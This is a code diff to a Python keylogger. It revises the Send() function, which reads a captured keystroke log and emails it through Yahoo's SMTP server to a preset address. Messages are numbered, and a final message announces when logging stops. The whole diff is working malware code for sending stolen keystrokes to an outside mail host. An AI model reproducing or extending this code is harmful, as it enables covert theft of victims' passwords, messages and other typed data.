@@ -15,12 +15,8 @@ previous = ''
 def Send():
     global count
     global previous
-    keylog = ReadLogFile()
-    while keylog == previous or len(keylog) == 0:
-        keylog = ReadLogFile()
-    sleep(600)
-    keylog = ReadLogFile()
-    previous = keylog
+    while ReadLogFile() == previous or len(ReadLogFile()) == 0:
+        continue
     smtp = smtplib.SMTP('smtp.mail.yahoo.com', 587) # Change Gmail is: smtp.gmail.com
     smtp.ehlo()
     smtp.starttls()
@@ -29,12 +25,21 @@ def Send():
     msg['From'] = email
     msg['To'] = email
     msg['Subject'] = 'Key #{}'.format(count)
-    msg.attach(MIMEText(keylog))
+    previous = ReadLogFile()
+    msg.attach(MIMEText(ReadLogFile()))
     smtp.sendmail(email, email, msg.as_string())
-    smtp.close()
     count += 1
-    if 'Done!!' in keylog:
+    if 'Done!!' in ReadLogFile():
+        msg = MIMEMultipart()
+        msg['From'] = email
+        msg['To'] = email
+        msg['Subject'] = 'Key #{}'.format(count+1)
+        msg.attach(MIMEText('\n[!] USER HAS PRESSED ALT! KEYLOGGING STOPPED!\n'))
+        smtp.sendmail(email, email, msg.as_string())
+        smtp.close()
         sys.exit(0)
+    smtp.close()
+    sleep(150)
 
 def ReadLogFile():
     try:
